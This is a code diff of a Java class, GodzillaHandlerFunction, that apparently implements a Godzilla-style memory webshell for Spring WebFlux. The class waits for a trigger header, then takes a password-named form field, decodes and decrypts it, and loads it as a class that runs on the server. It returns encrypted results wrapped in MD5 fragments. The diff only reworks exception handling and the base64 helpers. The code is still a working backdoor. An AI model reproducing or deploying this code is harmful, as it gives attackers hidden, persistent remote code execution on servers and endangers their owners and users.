@@ -34,34 +34,30 @@ public class GodzillaHandlerFunction extends ClassLoader implements HandlerFunct
         if (value == null || !value.contains(headerValue)) {
             return Mono.empty();
         }
-        try {
-            Object bufferStream = request.formData().flatMap(map -> {
-                StringBuilder result = new StringBuilder();
-                try {
-                    byte[] data = base64Decode(map.getFirst(pass));
-                    data = x(data, false);
-                    if (payload == null) {
-                        payload = new GodzillaHandlerFunction(Thread.currentThread().getContextClassLoader()).defineClass(null, data, 0, data.length);
-                    } else {
-                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                        Object f = payload.getDeclaredConstructor().newInstance();
-                        f.equals(arrOut);
-                        f.equals(data);
-                        f.equals(request);
-                        result.append(md5.substring(0, 16));
-                        f.toString();
-                        result.append(base64Encode(x(arrOut.toByteArray(), true)));
-                        result.append(md5.substring(16));
-                    }
-                } catch (Exception ex) {
-                    ex.printStackTrace();
+        Object bufferStream = request.formData().flatMap(map -> {
+            StringBuilder result = new StringBuilder();
+            try {
+                byte[] data = base64Decode(map.getFirst(pass));
+                data = x(data, false);
+                if (payload == null) {
+                    payload = new GodzillaHandlerFunction(Thread.currentThread().getContextClassLoader()).defineClass(null, data, 0, data.length);
+                } else {
+                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                    Object f = payload.getDeclaredConstructor().newInstance();
+                    f.equals(arrOut);
+                    f.equals(data);
+                    f.equals(request);
+                    f.toString();
+                    result.append(md5.substring(0, 16));
+                    result.append(base64Encode(x(arrOut.toByteArray(), true)));
+                    result.append(md5.substring(16));
                 }
-                return Mono.just(result.toString());
-            });
-            return ServerResponse.ok().body(bufferStream, String.class);
-        } catch (Exception ex) {
-            return ServerResponse.ok().body(Mono.just(ex.getMessage()), String.class);
-        }
+            } catch (Throwable ex) {
+                ex.printStackTrace();
+            }
+            return Mono.just(result.toString());
+        });
+        return ServerResponse.ok().body(bufferStream, String.class);
     }
 
 
@@ -74,18 +70,15 @@ public class GodzillaHandlerFunction extends ClassLoader implements HandlerFunct
             Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object encoder = base64.newInstance();
+            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
         return value;
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -93,12 +86,9 @@ public class GodzillaHandlerFunction extends ClassLoader implements HandlerFunct
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
